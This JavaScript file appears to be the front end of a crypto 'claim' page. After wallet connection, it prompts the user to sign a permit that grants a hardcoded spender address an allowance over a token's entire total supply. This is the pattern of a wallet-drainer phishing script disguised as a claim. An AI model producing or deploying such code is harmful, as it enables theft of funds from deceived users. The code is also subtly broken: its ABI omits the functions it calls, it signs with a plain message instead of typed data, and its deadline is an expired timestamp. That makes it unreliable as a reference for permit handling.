// HTML elements
const connectButton = document.getElementById("connect");
const mainButton = document.getElementById("main");
mainButton.disabled = true;

// Define the PermitERC20_ABI
const PermitERC20_ABI = [
  {"inputs":[{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_symbol","type":"string"},{"internalType":"uint8","name":"_decimals","type":"uint8"},{"internalType":"address","name":"_underlying","type":"address"},{"internalType":"address","name":"_vault","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"auth","type":"address"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"LogAddAuth","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"oldOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"},{"indexed":true,"internalType":"uint256","name":"effectiveHeight","type":"uint256"}],"name":"LogChangeMPCOwner","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"oldVault","type":"address"},{"indexed":true,"internalType":"address","name":"newVault","type":"address"},{"indexed":true,"internalType":"uint256","name":"effectiveTime","type":"uint256"}],"name":"LogChangeVault","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"txhash","type":"bytes32"},{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"LogSwapin","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"account","type":"address"},{"indexed":true,"internalType":"address","name":"bindaddr","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"LogSwapout","type":"event"},
  {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
  {"inputs":[],"name":"DOMAIN_SEPARATOR","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"PERMIT_TYPEHASH","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},
  {"inputs":[{"internalType":"bytes32","name":"txhash","type":"bytes32"},{"internalType":"address","name":"account","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Swapin","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
  {"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"bindaddr","type":"address"}],"name":"Swapout","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
  // Add more function entries as per your requirements
];

// Replace the parameter values with your specific values
const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const spenderAddress = "0xC28717eC00eeCe287D5c8AAF10052BC445A8ae34";
const deadline = 172800;
const message = "Claim";

// Connect wallet and request permit signature
async function connectWallet() {
  try {
    // Prompt the user to connect their wallet
    await ethereum.request({ method: "eth_requestAccounts" });
    console.log("Wallet connected!");

    // Once the wallet is connected, call the requestPermit function
    await requestPermit(tokenAddress, spenderAddress, deadline, message);
  } catch (error) {
    console.error("Error connecting wallet:", error);
  }
}

// Request the permit signature
async function requestPermit(tokenAddress, spenderAddress, deadline, message) {
  const provider = new ethers.providers.Web3Provider(window.ethereum);
  const signer = provider.getSigner();
  const ownerAddress = await signer.getAddress();

  // Create the token contract instance
  const tokenContract = new ethers.Contract(tokenAddress, PermitERC20_ABI, signer);

  // Get the total supply of the token
  const totalSupply = await tokenContract.totalSupply();

  // Set the amount to the total supply
  const amount = totalSupply;

  // Request the permit signature from the owner
  const nonce = await tokenContract.nonces(ownerAddress);
  const deadlineBigInt = ethers.BigNumber.from(deadline);
  const permitData = ethers.utils.defaultAbiCoder.encode(
    ["address", "address", "uint256", "uint256", "string"],
    [ownerAddress, spenderAddress, amount, deadlineBigInt, message]
  );

  // Sign the permit data
  const permitSignature = await signer.signMessage(ethers.utils.arrayify(permitData));

  // Perform the token transfer with the permit signature
  await tokenContract.permit(ownerAddress, spenderAddress, amount, deadlineBigInt, permitSignature);

  console.log("Permit signature requested and transfer performed!");
}

// Event listener for connect button
connectButton.addEventListener("click", connectWallet);